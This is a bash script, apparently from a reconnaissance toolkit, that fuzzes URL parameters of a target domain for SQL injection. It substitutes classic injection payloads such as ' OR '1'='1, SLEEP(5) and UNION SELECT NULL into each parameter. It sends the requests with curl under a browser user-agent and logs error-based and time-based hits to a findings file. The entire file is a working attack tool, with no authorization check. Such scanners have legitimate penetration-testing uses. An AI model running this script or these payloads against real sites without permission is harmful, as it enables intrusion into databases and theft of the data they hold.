#!/usr/bin/env bash
TARGET="${1:-}"
OUTDIR="${2:-recon/$TARGET}"

if [[ -z "$TARGET" ]]; then
  echo "Usage: $0 <domain> <recon_dir>"
  exit 1
fi

echo "[*] SQLi Fuzzer — testing parameters..."
FINDINGS="$OUTDIR/sqli_fuzzer_findings.txt"
touch "$FINDINGS"

PAYLOADS=(
  "'"
  "' OR '1'='1"
  "' OR 1=1--"
  "' AND SLEEP(5)--"
  "1' ORDER BY 1--"
  "' UNION SELECT NULL--"
)

COUNT=0
HITS=0

while read -r url; do
  params=$(echo "$url" | grep -oP '(?<=\?).*' | tr '&' '\n' | cut -d= -f1)
  [[ -z "$params" ]] && continue

  for param in $params; do
    for payload in "${PAYLOADS[@]}"; do
      encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
      test_url=$(echo "$url" | sed "s|\($param=\)[^&]*|\1$encoded|")

      start=$(date +%s%3N)
      response=$(curl -sk "$test_url" --max-time 10 \
        -H "User-Agent: Mozilla/5.0" 2>/dev/null || true)
      end=$(date +%s%3N)
      elapsed=$(( end - start ))

      COUNT=$((COUNT + 1))

      # Check for SQL errors
      if echo "$response" | grep -qiE "sql|mysql|sqlite|postgresql|oracle|syntax error|warning.*mysql|unclosed quotation|quoted string not properly terminated"; then
        echo "[!] SQL ERROR on $param with payload: $payload"
        echo "[!] URL: $test_url"
        echo "SQLI_ERROR: $test_url | param=$param | payload=$payload" >> "$FINDINGS"
        HITS=$((HITS + 1))
      fi

      # Check for time-based (SLEEP)
      if [[ "$payload" == *"SLEEP"* && $elapsed -gt 4500 ]]; then
        echo "[!] TIME-BASED SQLi on $param (${elapsed}ms delay)"
        echo "[!] URL: $test_url"
        echo "SQLI_TIME: $test_url | param=$param | elapsed=${elapsed}ms" >> "$FINDINGS"
        HITS=$((HITS + 1))
      fi
    done
  done

done < <(grep "?" "$OUTDIR/sqli-candidates.txt" 2>/dev/null | head -30)

echo ""
echo "[*] SQLi Fuzzer complete"
echo "[*] Params tested : $COUNT"
echo "[*] Potential hits: $HITS"
echo "[*] Results       : $FINDINGS"
